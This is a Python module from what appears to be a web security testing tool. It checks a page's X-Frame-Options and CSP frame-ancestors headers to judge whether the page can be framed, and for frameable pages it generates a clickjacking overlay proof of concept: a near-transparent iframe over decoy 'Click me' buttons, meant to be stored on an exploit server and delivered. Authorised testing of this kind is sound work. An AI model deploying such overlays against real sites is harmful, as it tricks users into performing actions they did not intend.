"""Edge-case test: test_clickjacking — frameability verdict + PoC generator.

analyze_csp flags a permissive CSP frame-ancestors but does not check
X-Frame-Options, does not combine the two the way a browser does, and emits no
attack PoC. This tool gives one frameable/protected verdict (CSP frame-ancestors
authoritative over X-Frame-Options in modern browsers; legacy XFO ALLOW-FROM
ignored) and, when frameable, a ready-to-store clickjacking overlay for the
PortSwigger-style exploit server.
"""

from praetor import client
from praetor.tools.testing._verdict import make_verdict


def frame_ancestors(csp: str | None) -> list[str] | None:
    """Return the frame-ancestors source list (lowercased) from a CSP header, or
    None when the directive is absent. An empty list = directive present, no
    sources (equivalent to 'none')."""
    if not csp:
        return None
    for directive in csp.split(";"):
        parts = directive.strip().split()
        if parts and parts[0].lower() == "frame-ancestors":
            return [p.lower() for p in parts[1:]]
    return None


def assess_frameability(xfo: str | None, csp: str | None) -> dict:
    """Decide whether a page can be framed cross-origin (clickjacking-exploitable).

    Modern browsers honour CSP frame-ancestors over X-Frame-Options and ignore
    the legacy XFO ALLOW-FROM form. Returns {frameable: bool, protection: str|None,
    reason: str}.
    """
    fa = frame_ancestors(csp)
    if fa is not None:  # CSP frame-ancestors is authoritative when present
        if not fa or "'none'" in fa:
            return {"frameable": False, "protection": "CSP frame-ancestors 'none'",
                    "reason": "CSP frame-ancestors blocks all framing"}
        if "*" in fa:
            return {"frameable": True, "protection": None,
                    "reason": "CSP frame-ancestors '*' allows framing by any origin"}
        # 'self' or an explicit allow-list — cross-origin framing blocked
        return {"frameable": False, "protection": "CSP frame-ancestors " + " ".join(fa),
                "reason": "CSP frame-ancestors restricts framing to same-origin / an allow-list"}

    if xfo:  # fall back to X-Frame-Options
        v = xfo.strip().lower()
        if v == "deny":
            return {"frameable": False, "protection": "X-Frame-Options: DENY",
                    "reason": "X-Frame-Options DENY blocks all framing"}
        if v == "sameorigin":
            return {"frameable": False, "protection": "X-Frame-Options: SAMEORIGIN",
                    "reason": "X-Frame-Options SAMEORIGIN blocks cross-origin framing"}
        if v.startswith("allow-from"):
            return {"frameable": True, "protection": None,
                    "reason": "X-Frame-Options ALLOW-FROM is ignored by modern browsers — no protection"}
        return {"frameable": True, "protection": None,
                "reason": f"X-Frame-Options value '{xfo}' is invalid — no effective protection"}

    return {"frameable": True, "protection": None,
            "reason": "no X-Frame-Options and no CSP frame-ancestors — page is frameable"}


def build_clickjacking_poc(target_url: str, multistep: bool = True) -> str:
    """Emit a clickjacking overlay PoC. opacity is 0.1 (align in a browser), drop
    to 0.0001 for delivery. Coordinates are starting points to nudge onto the
    target button(s)."""
    if multistep:
        return (
            "<style>\n"
            "    iframe { position:relative; width:500px; height:700px; opacity:0.1; z-index:2; }\n"
            "    .firstClick, .secondClick { position:absolute; top:330px; left:50px; z-index:1; }\n"
            "    .secondClick { top:285px; left:225px; }\n"
            "</style>\n"
            '<div class="firstClick">Click me first</div>\n'
            '<div class="secondClick">Click me next</div>\n'
            f'<iframe src="{target_url}"></iframe>'
        )
    return (
        "<style>\n"
        "    iframe { position:relative; width:700px; height:500px; opacity:0.1; z-index:2; }\n"
        "    div { position:absolute; top:300px; left:60px; z-index:1; }\n"
        "</style>\n"
        '<div>Click me</div>\n'
        f'<iframe src="{target_url}"></iframe>'
    )


async def test_clickjacking_impl(session: str, path: str = "/",
                                 multistep: bool = True, target_url: str = "") -> dict:
    """Fetch `path` via the session, verdict its frameability, and emit a PoC when frameable."""
    resp = await client.post("/api/session/request", json={
        "session": session, "method": "GET", "path": path,
    })
    if "error" in resp:
        return make_verdict("FAILED", 0.1, f"request error: {resp['error']}",
                            vuln_type="clickjacking")

    xfo = csp = None
    for h in resp.get("response_headers", []):
        n = h["name"].lower()
        if n == "x-frame-options":
            xfo = h["value"]
        elif n == "content-security-policy":
            csp = h["value"]

    a = assess_frameability(xfo, csp)
    url = target_url or resp.get("url") or path
    fa = frame_ancestors(csp)
    lines = [
        f"Clickjacking / frameability: {path}",
        f"  X-Frame-Options: {xfo or '(absent)'}",
        f"  CSP frame-ancestors: {' '.join(fa) if fa else ('(present, empty)' if fa == [] else '(absent)')}",
        f"  Verdict: {'FRAMEABLE' if a['frameable'] else 'PROTECTED'} — {a['reason']}",
    ]

    if a["frameable"]:
        poc = build_clickjacking_poc(url, multistep=multistep)
        lines.append(
            "\nPoC (store on exploit server; log into the target in the SAME browser to "
            "align — a cross-site iframe needs the target's SameSite=None cookie, which "
            "modern Chrome may block third-party; drop opacity to 0.0001 to deliver):\n" + poc)
        lines.append(
            "\nNOTE: clickjacking is not reportable alone — only a sensitive/state-changing "
            "action framed (chain_with). Alone it is closed Informative.")
        return make_verdict(
            "CONFIRMED", 0.8, f"page is frameable cross-origin: {a['reason']}",
            vuln_type="clickjacking",
            details={"path": path, "x_frame_options": xfo,
                     "csp_frame_ancestors": fa, "poc": poc},
            summary="\n".join(lines))

    return make_verdict(
        "FAILED", 0.1, f"page is not frameable: {a['reason']}",
        vuln_type="clickjacking",
        details={"path": path, "protection": a["protection"]},
        summary="\n".join(lines))
